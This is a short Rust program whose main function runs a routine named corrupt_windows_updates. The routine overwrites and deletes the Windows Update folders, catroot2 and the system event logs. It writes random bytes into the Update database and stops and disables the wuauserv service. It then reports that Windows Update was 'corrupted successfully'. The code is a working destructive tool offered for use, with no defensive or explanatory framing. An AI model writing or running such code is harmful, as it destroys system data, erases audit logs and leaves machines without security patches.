use std::fs::{File, OpenOptions, remove_file, remove_dir_all};
use std::io::{Write};
use std::path::Path;
use walkdir::WalkDir;
use std::error::Error;
use rand::Rng;
use std::process::Command;

/// Securely wipe a file by overwriting with random data before deletion
fn secure_wipe_file(path: &Path) -> std::io::Result<()> {
    let file_size = path.metadata()?.len() as usize;
    let random_data: Vec<u8> = (0..file_size).map(|_| rand::random::<u8>()).collect();
    
    let mut file = OpenOptions::new()
        .write(true)
        .open(path)?;
        
    // Overwrite file contents with random data multiple times
    for _ in 0..3 {
        file.write_all(&random_data)?;
        file.sync_all()?;
    }
    
    // Finally delete the file
    remove_file(path)?;
    Ok(())
}

/// Wipe all files in a directory recursively
fn wipe_directory(dir: &str) -> Result<(), Box<dyn Error>> {
    // First wipe all files
    for entry in WalkDir::new(dir).into_iter().filter_map(|e| e.ok()) {
        if entry.file_type().is_file() {
            secure_wipe_file(entry.path())?;
        }
    }
    
    // Then remove all empty directories
    remove_dir_all(dir)?;
    Ok(())
}

fn corrupt_windows_updates() -> Result<(), Box<dyn Error>> {
    let windows_dirs = vec![
        "C:\\Windows\\SoftwareDistribution",
        "C:\\Windows\\System32\\winevt\\Logs",
        "C:\\Windows\\System32\\catroot2"
    ];

    // Remove Windows Update directories
    for dir in windows_dirs {
        if let Err(e) = wipe_directory(dir) {
            println!("Failed to wipe {}: {}", dir, e);
        }
    }

    // Corrupt Windows Update database
    if let Ok(mut file) = OpenOptions::new().write(true).open("C:\\Windows\\SoftwareDistribution\\DataStore\\DataStore.edb") {
        let random_data: Vec<u8> = (0..1024).map(|_| rand::random::<u8>()).collect();
        let _ = file.write_all(&random_data);
    }

    // Disable Windows Update service
    let _ = Command::new("cmd")
        .args(&["/C", "net", "stop", "wuauserv"])
        .status();

    let _ = Command::new("cmd")
        .args(&["/C", "sc", "config", "wuauserv", "start=disabled"])
        .status();

    Ok(())
}

fn main() -> Result<(), Box<dyn Error>> {
    corrupt_windows_updates()?;
    println!("Windows Update system corrupted successfully.");
    Ok(())
}